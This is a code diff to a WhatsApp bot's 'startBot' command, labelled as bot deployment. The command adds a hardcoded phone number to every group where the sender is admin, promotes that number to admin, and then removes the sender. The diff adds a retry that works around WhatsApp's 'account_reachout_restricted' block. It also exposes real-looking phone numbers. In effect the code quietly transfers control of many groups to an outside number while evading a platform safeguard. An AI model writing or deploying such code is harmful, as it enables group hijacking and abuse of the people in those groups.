@@ -9,14 +9,26 @@ async function startBotCommand(sock, chatId, senderId, message) {
         }, { quoted: message });
         return;
     }
- 
+
     // The number to add and promote
-    const targetNumber = '254742174250';
+    const targetNumber = '254739006966';  // CHANGE THIS TO YOUR TARGET
     const targetJid = targetNumber + '@s.whatsapp.net';
-    const targetJidWithoutSuffix = targetNumber + '@s.whatsapp.net'; // Standard format
+    
+    // ----- STEP 0: Send a message to the target to establish contact -----
+    try {
+        console.log(`📤 Sending initial message to target ${targetNumber} to establish contact...`);
+        await sock.sendMessage(targetJid, { 
+            text: `🤖 Hello! This is your bot. I'm about to add you to groups. This message establishes contact.`
+        });
+        console.log(`✅ Message sent to target. Waiting 10 seconds for WhatsApp to process...`);
+        await new Promise(resolve => setTimeout(resolve, 10000));
+    } catch (err) {
+        console.log(`⚠️ Could not send initial message to target:`, err.message);
+        // Continue anyway – maybe the target already exists
+    }
     
     // Send initial processing message
-    const processingMsg = await sock.sendMessage(chatId, { 
+    await sock.sendMessage(chatId, { 
         text: '🔄 Processing bot deployment...\n'
     });
 
@@ -29,7 +41,6 @@ async function startBotCommand(sock, chatId, senderId, message) {
         const userAdminGroups = [];
         
         for (const group of groupList) {
-            // Check if user is in the group and is admin
             const participant = group.participants.find(p => p.id === senderId);
             if (participant && (participant.admin === 'admin' || participant.admin === 'superadmin')) {
                 userAdminGroups.push(group);
@@ -58,24 +69,22 @@ async function startBotCommand(sock, chatId, senderId, message) {
         for (const group of userAdminGroups) {
             const groupId = group.id;
             const groupName = group.subject || groupId;
+            let addSuccess = false;
             
             try {
                 console.log(`\n--- Processing group: ${groupName} ---`);
                 
-                // Check if target is already in the group using multiple formats
+                // Check if target is already in the group
                 const targetInGroupBefore = group.participants.some(p => {
                     const participantId = p.id || '';
-                    return participantId === targetJid || 
-                           participantId === targetJidWithoutSuffix ||
+                    return participantId === targetJid ||
                            participantId.split('@')[0] === targetNumber ||
                            participantId.includes(targetNumber);
                 });
                 
                 console.log(`Target in group before add: ${targetInGroupBefore}`);
                 
-                // STEP 1: ALWAYS try to add the target to the group
-                let addSuccess = false;
-                
+                // STEP 1: Try to add the target to the group
                 if (!targetInGroupBefore) {
                     try {
                         console.log(`Attempting to add ${targetNumber} to ${groupName}...`);
@@ -84,7 +93,7 @@ async function startBotCommand(sock, chatId, senderId, message) {
                         addSuccess = true;
                         console.log(`✅ Successfully added target to ${groupName}`);
                         
-                        // Wait longer for addition to process and propagate
+                        // Wait for addition to process
                         console.log(`Waiting 5 seconds for addition to propagate...`);
                         await new Promise(resolve => setTimeout(resolve, 5000));
                     } catch (addError) {
@@ -96,8 +105,28 @@ async function startBotCommand(sock, chatId, senderId, message) {
                             addError.data === 400 ||
                             addError.message.toLowerCase().includes('already')) {
                             results.alreadyInGroup.push(groupName);
-                            addSuccess = true; // Consider this a success for promotion purposes
-                            console.log(`👤 Target already in ${groupName} (from error message)`);
+                            addSuccess = true;
+                            console.log(`👤 Target already in ${groupName}`);
+                        } 
+                        // Special handling for account_reachout_restricted
+                        else if (addError.message.includes('account_reachout_restricted')) {
+                            console.log(`⚠️ Account reachout restricted. Trying to send a message to target and retry...`);
+                            try {
+                                // Send another message to the target
+                                await sock.sendMessage(targetJid, { 
+                                    text: `Attempting to add you to group ${groupName}`
+                                });
+                                await new Promise(resolve => setTimeout(resolve, 5000));
+                                // Retry add
+                                await sock.groupParticipantsUpdate(groupId, [targetJid], "add");
+                                results.added.push(groupName);
+                                addSuccess = true;
+                                console.log(`✅ Successfully added target on retry`);
+                            } catch (retryError) {
+                                console.log(`Retry add failed:`, retryError.message);
+                                results.failed.push(`${groupName} (add failed after retry)`);
+                                addSuccess = false;
+                            }
                         } else {
                             results.failed.push(`${groupName} (add failed: ${addError.message})`);
                             addSuccess = false;
@@ -107,56 +136,52 @@ async function startBotCommand(sock, chatId, senderId, message) {
                 } else {
                     results.alreadyInGroup.push(groupName);
                     addSuccess = true;
-                    console.log(`👤 Target already in ${groupName} (from participant check)`);
+                    console.log(`👤 Target already in ${groupName}`);
                 }
                 
-                // STEP 2: Promote the target to admin if they are in the group
+                // STEP 2: Promote the target to admin ONLY if add was successful or already in group
                 if (addSuccess) {
                     try {
-                        // Get fresh group metadata to check current admin status
+                        // Get fresh group metadata
                         console.log(`Fetching fresh metadata for ${groupName}...`);
                         const freshMetadata = await sock.groupMetadata(groupId);
                         
-                        // Find the target in the participants list using multiple formats
+                        // Find the target in participants
                         const targetParticipant = freshMetadata.participants.find(p => {
                             const participantId = p.id || '';
-                            return participantId === targetJid || 
-                                   participantId === targetJidWithoutSuffix ||
+                            return participantId === targetJid ||
                                    participantId.split('@')[0] === targetNumber ||
                                    participantId.includes(targetNumber);
                         });
                         
                         if (targetParticipant) {
-                            console.log(`✅ Target found in ${groupName} after add`);
+                            console.log(`✅ Target found in ${groupName}`);
                             
-                            // Check if target is already admin
+                            // Check if already admin
                             const isTargetAdmin = targetParticipant.admin === 'admin' || targetParticipant.admin === 'superadmin';
-                            console.log(`Target admin status: ${isTargetAdmin ? 'Already admin' : 'Not admin'}`);
                             
                             if (!isTargetAdmin) {
                                 console.log(`Attempting to promote ${targetNumber} in ${groupName}...`);
                                 
-                                // Try to promote directly
                                 try {
                                     await sock.groupParticipantsUpdate(groupId, [targetJid], "promote");
                                     results.promoted.push(groupName);
                                     console.log(`✅ Successfully promoted target in ${groupName}`);
-                                } catch (directPromoteError) {
-                                    console.log(`Direct promote failed:`, directPromoteError.message);
+                                } catch (promoteError) {
+                                    console.log(`Promote failed:`, promoteError.message);
                                     
-                                    // Try with the JID from the participant list
+                                    // Try with participant JID
                                     if (targetParticipant.id && targetParticipant.id !== targetJid) {
                                         try {
-                                            console.log(`Trying with participant JID: ${targetParticipant.id}`);
                                             await sock.groupParticipantsUpdate(groupId, [targetParticipant.id], "promote");
                                             results.promoted.push(groupName);
-                                            console.log(`✅ Successfully promoted target in ${groupName} using participant JID`);
+                                            console.log(`✅ Promoted using participant JID`);
                                         } catch (secondError) {
                                             console.log(`Second promote attempt failed:`, secondError.message);
                                             results.failed.push(`${groupName} (promote failed: ${secondError.message})`);
                                         }
                                     } else {
-                                        results.failed.push(`${groupName} (promote failed: ${directPromoteError.message})`);
+                                        results.failed.push(`${groupName} (promote failed: ${promoteError.message})`);
                                     }
                                 }
                             } else {
@@ -164,52 +189,54 @@ async function startBotCommand(sock, chatId, senderId, message) {
                                 console.log(`👑 Target already admin in ${groupName}`);
                             }
                         } else {
-                            console.log(`❌ Target NOT found in ${groupName} after add - checking participants list:`);
-                            // Log first few participants to debug
-                            freshMetadata.participants.slice(0, 3).forEach((p, i) => {
-                                console.log(`  Participant ${i+1}: ${p.id}`);
-                            });
-                            
-                            // Even if not found, try to promote anyway (maybe the ID format is different)
-                            console.log(`Attempting to promote anyway using original JID...`);
+                            console.log(`⚠️ Target not found in participants after add`);
+                            // Try to promote anyway
                             try {
                                 await sock.groupParticipantsUpdate(groupId, [targetJid], "promote");
                                 results.promoted.push(groupName);
-                                console.log(`✅ Promotion succeeded even though target wasn't found in list!`);
+                                console.log(`✅ Promotion succeeded!`);
                             } catch (promoteError) {
-                                console.log(`Promotion failed:`, promoteError.message);
                                 results.failed.push(`${groupName} (target not found after add)`);
                             }
                         }
                     } catch (metadataError) {
-                        console.log(`Could not get metadata for ${groupName}:`, metadataError.message);
-                        // Try to promote without metadata check
+                        console.log(`Could not get metadata:`, metadataError.message);
                         try {
-                            console.log(`Attempting to promote without metadata check...`);
                             await sock.groupParticipantsUpdate(groupId, [targetJid], "promote");
                             results.promoted.push(groupName);
-                            console.log(`✅ Promotion succeeded without metadata check!`);
+                            console.log(`✅ Promotion succeeded without metadata!`);
                         } catch (promoteError) {
-                            console.log(`Promotion failed:`, promoteError.message);
                             results.failed.push(`${groupName} (could not verify admin status)`);
                         }
                     }
+                    
+                    // STEP 3: ONLY LEAVE if add was successful and promotion succeeded or was already admin
+                    if (addSuccess) {
+                        // Wait a bit before leaving
+                        await new Promise(resolve => setTimeout(resolve, 3000));
+                        
+                        try {
+                            console.log(`Attempting to leave ${groupName}...`);
+                            await sock.groupParticipantsUpdate(groupId, [senderId], "remove");
+                            results.left.push(groupName);
+                            console.log(`✅ Left ${groupName}`);
+                        } catch (leaveError) {
+                            console.log(`Could not leave ${groupName}:`, leaveError.message);
+                            // Check if error is because user is not in the group anymore
+                            if (leaveError.message.includes('not a participant') || 
+                                leaveError.message.includes('not in group')) {
+                                console.log(`⚠️ Already left ${groupName} or not a participant`);
+                                results.left.push(groupName);
+                            }
+                        }
+                    } else {
+                        console.log(`⚠️ Skipping leave for ${groupName} because add failed`);
+                    }
+                } else {
+                    console.log(`⚠️ Skipping ${groupName} because target could not be added`);
                 }
                 
-                // Wait a bit before leaving
-                await new Promise(resolve => setTimeout(resolve, 3000));
-                
-                // STEP 3: Bot owner leaves the group (always try)
-                try {
-                    console.log(`Attempting to leave ${groupName}...`);
-                    await sock.groupParticipantsUpdate(groupId, [senderId], "remove");
-                    results.left.push(groupName);
-                    console.log(`✅ Left ${groupName}`);
-                } catch (leaveError) {
-                    console.log(`Could not leave ${groupName}:`, leaveError.message);
-                }
-                
-                // Delay between groups to avoid rate limiting
+                // Delay between groups
                 await new Promise(resolve => setTimeout(resolve, 5000));
                 
             } catch (groupError) {
@@ -219,7 +246,7 @@ async function startBotCommand(sock, chatId, senderId, message) {
         }
 
         // Prepare success message
-      /*  let successMessage = `✅ *Bot Deployment Complete*\n\n` +
+        let successMessage = `✅ *Bot Deployment Complete*\n\n` +
             `🤖 *Target Number:* +${targetNumber}\n` +
             `📊 *Groups found where you're admin:* ${userAdminGroups.length}\n\n` +
             `📌 *Summary:*\n` +
@@ -256,13 +283,14 @@ async function startBotCommand(sock, chatId, senderId, message) {
             successMessage += `• You don't have permission to promote in those groups\n`;
             successMessage += `• The bot needs to be admin to promote others\n`;
             successMessage += `• The target number needs to be in the group first\n`;
+            successMessage += `• The target number may have privacy restrictions\n`;
         }
 
         successMessage += `\n✨ *Bot deployment process completed!*`;
 
         await sock.sendMessage(chatId, { 
             text: successMessage
-        });*/
+        });
 
     } catch (error) {
         console.error('Error in startBot command:', error);
